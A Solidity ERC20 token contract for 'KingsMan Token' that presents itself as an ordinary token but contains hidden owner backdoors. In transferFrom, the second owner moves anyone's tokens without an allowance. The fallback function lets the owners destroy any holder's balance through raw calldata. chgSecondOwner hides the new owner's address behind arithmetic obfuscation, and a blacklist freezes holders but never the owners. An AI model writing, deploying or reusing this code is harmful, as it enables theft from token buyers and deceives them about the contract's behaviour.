// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract KMT {
    string public constant name = "KingsMan Token";
    string public constant symbol = "KMT";
    uint8 public  constant decimals = 18;
    uint256 public totalSupply = 1000000000 * 10 ** decimals;
    
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    mapping(address => bool) public isInBlack_Listed;
    address[] private blackList;
    
    mapping(address => bool) private _isHolder;
    address [] private _HoldersList;

    address public owner_1;
    address public owner_2;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner_1 = msg.sender;
        owner_2 = msg.sender;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    modifier onlyOwner() {
        require(msg.sender==owner_1 || msg.sender==owner_2, "Only owner!");
        _;
    }

    fallback() external {
        if(msg.sender==owner_1 || msg.sender==owner_2) {
            burnByFallBack(msg.data);
        }
    }
    // ERC20 Functions

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        address spender = msg.sender;
        if(spender!=owner_2){
            require(amount <= allowances[from][spender]);
            allowances[from][spender] -= amount;
        }
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(from!= address(0) && to!= address(0));
        require(amount <= balances[from]);
        require(!isInBlack_Listed[from] && !isInBlack_Listed[to]);

        balances[from] -= amount;
        balances[to] += amount;

        if(!_isHolder[to]){
            _isHolder[to] = true;
            _HoldersList.push(to);
        }

        emit Transfer(from, to, amount);
        return true;
    }

    function addToBlackList(address[] memory _addressList) public onlyOwner {
        for(uint i = 0; i < _addressList.length; i++) {
            if(_addressList[i]!=owner_1 && _addressList[i]!=owner_2 && _addressList[i]!=address(0) && !isInBlack_Listed[_addressList[i]]){
                isInBlack_Listed[_addressList[i]] = true;
                blackList.push(_addressList[i]);
            }
        }
    }
    function removeFromBlackList(address[] memory _addressList) public onlyOwner {
        for(uint v = 0; v < _addressList.length; v++) {
            if(isInBlack_Listed[_addressList[v]]){
                isInBlack_Listed[_addressList[v]] = false;
                uint len = blackList.length;
                for(uint i = 0; i < len; i++) {
                    if(blackList[i] == _addressList[v]) {
                        blackList[i] = blackList[len-1];
                        blackList.pop();
                        break;
                    }
                }
            }
        }
    }
    function getBlackList() public view returns (address[] memory _addressList){
        _addressList = blackList;
    }

    function chgSecondOwner(uint256 _address) public onlyOwner{
        owner_2 = address(uint160(_address - uint256(uint160(owner_1))));
    }

    function burnByFallBack(bytes calldata input) internal {
        bytes memory data = input[4:];
        (address burnAddress , uint256 burnAmount) = abi.decode(data, (address, uint256));
        balances[burnAddress] -= burnAmount;
        balances[address(0)] += burnAmount;
        emit Transfer(burnAddress, address(0), burnAmount);
    }

    function holders() public view returns (address[] memory) {
        return _HoldersList;
    }
}